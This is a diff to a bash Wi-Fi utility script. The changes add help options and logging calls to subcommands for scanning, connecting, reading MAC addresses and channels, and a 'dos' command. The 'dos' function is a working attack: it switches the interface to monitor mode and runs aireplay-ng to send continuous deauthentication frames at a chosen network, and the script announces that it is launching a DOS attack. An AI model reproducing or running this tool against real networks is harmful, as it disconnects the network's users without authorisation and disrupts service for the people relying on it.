@@ -1,7 +1,8 @@
 source $PODGL/lib/fsh.cfg.sh
 NetworkManager &> /dev/null
-if [ "$1" == "" ]; then
-  printf "${green}Usage$white:\n   -$green wifi${white} connect <wifi name>\n   - ${green}wifi${white} scan\n${green}wifi$white dos <wifi name>\n"
+if [ "$1" == "" ] || [ "$1" == '-h' ] || [ "$1" == "--help" ]; then
+  printf "${green}Usage$white:\n   -$green wifi$white scan\n   -$green wifi$white restart\n   -$green wifi${white} connect <${purple}wifi name${white}>\n   -${green} wifi$white dos <${purple}wifi name${white}>\n   - ${green}wifi$white mac <${purple}wifi name${white}>\n   -$green wifi$white channel <${purple}wifi name${white}>\n"
+  exit 1
 fi
 connect(){
   if [ $1 == "" ]; then
@@ -11,15 +12,18 @@ connect(){
   read ps
   printf $green"Connecting To $1 With Password $ps...$white\n"
   nmcli dev wifi connect "$1" password "$ps"
+  clog "Connected To A Wireless Access Point: $GREEN$1$WHITE"
 }
 
 scan(){
   nmcli dev wifi list
+  clog "Scanned For Nearby Wireless Access Points"
 }
 
 mac(){
         local maca=$(scan | grep "$1" | head -c 25 | sed s/' '/''/g)
 	printf "$maca\n" | sed s/"*"/''/g
+	clog "Showed The MAC Address For $GREEN$1$WHITE"
 }
 interface=
 restart(){
@@ -27,10 +31,12 @@ restart(){
 	airmon-ng stop ${interface}mon &> /dev/null
 	NetworkManager &> /dev/null
 	cout "DONE !"
+	clog "Restarted The Wireless Interface to theGREEN Managed Mode$white"
 }
 channel(){
         tmp=$(echo "$1" | sed s/' '/''/g)
         printf "$($PODGL/run/out 5 $(scan | grep "$1"| sed s/"$1"/"$tmp"/g | sed s/"*"/''/g))\n"
+	clog "Showed The Channel That$GREEN $1$WHITE Currently Operating With it"
 }
 dos(){
 	trap restart SIGINT
@@ -60,6 +66,7 @@ dos(){
 	warn "Launching Wifi ${RED}DOS Attack$WHITE Against $RED$1$WHITE Now !!!!"
 	sleep 1
 	cout "Deauthentication Attack Successfully Launched, To Stop ${GREEN}PRESS CTRL-C$WHITE"
+	clog "Launched A$RED Deauthentication Denial Of Service (DOS) Attack$WHITE Against This Wireless Network: $GREEN $1$WHITE"
 	aireplay-ng -00 -a "$macaddr" ${interface}mon &> /dev/null
 }
 $1 $2
